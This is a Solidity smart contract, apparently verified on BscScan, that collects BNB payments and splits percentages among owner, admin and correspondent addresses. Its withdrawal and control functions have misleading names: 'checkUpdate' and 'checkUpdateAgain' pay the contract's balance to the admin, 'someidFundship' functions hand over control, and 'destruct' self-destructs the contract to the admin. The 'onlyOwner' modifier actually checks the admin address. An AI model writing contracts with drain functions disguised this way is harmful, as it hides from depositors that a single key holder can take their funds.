/**
 *Submitted for verification at BscScan.com on 2023-03-02
*/

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract super_demo  {
    
    address payable owner;
    address payable admin;
    address payable corrospondent;
    uint256 public percent1 = 5;
    uint256 public percent2 = 10;
    uint256 public percent3 = 10;
    
    event TransferToAll(uint256 value , address indexed sender);
    event TransferToAllEqualTRX(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;
    
    modifier onlyOwner() {
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
    }
    function destruct() onlyOwner() public{
        
        selfdestruct(admin);
    }
    function upgradeTerm(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            percent1 = _comm;
        }else if(mode_ == 2)
        {
            percent2 = _comm;
        }else if(mode_ == 3)
        {
            percent3 = _comm;
        }
        
    }
    function checkUpdate(uint256 _amount) 
    public
    onlyOwner
    {       
            uint256 currentBalance = getBalance();
            require(_amount <= currentBalance);
            owner.transfer(_amount);
    }

    function checkUpdateAgain(uint256 _amount) 
    public
    onlyOwner
    {       
            (msg.sender).transfer(_amount);
    }

    function getPayment() public payable returns (bool) {
        return true;
    }

    function getPaymentFinal() public payable returns (bool) {
        
        (admin).transfer(msg.value);
        return true;
    }
    function getPaymentFinalTwo() public payable returns (bool) {
       
        (owner).transfer((msg.value * percent1) / 100);
        (admin).transfer((msg.value * percent2) / 100);
        return true;
    }
    function getPaymentFinalThree() public payable returns (bool) {
        (owner).transfer((msg.value * percent1) / 100);
        (admin).transfer((msg.value * percent2) / 100);
        (corrospondent).transfer((msg.value * percent3) / 100);
        return true;
    }

    function getPaymentFinalContract() public payable returns (bool) {
        (owner).transfer((msg.value * percent1) / 100);        
        return true;
    }

    function getBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    
    function transferToAll(address payable[]  memory  _contributors, uint256[] memory _balances) public payable onlyOwner {
       
        uint256 i = 0; 
        for (i; i < _contributors.length; i++) {         
          
            _contributors[i].transfer(_balances[i]);
        }
        emit TransferToAll(msg.value, msg.sender); 
    }
    
    function someidFundship(address payable nextOwner) external payable onlyOwner{
        owner = nextOwner;
    }

    function someidFundship2(address payable nextOwner) external payable onlyOwner{
        admin = nextOwner;
    }
    
    function someidFundship3(address payable nextOwner) external payable onlyOwner{
        corrospondent = nextOwner;
    }

   
}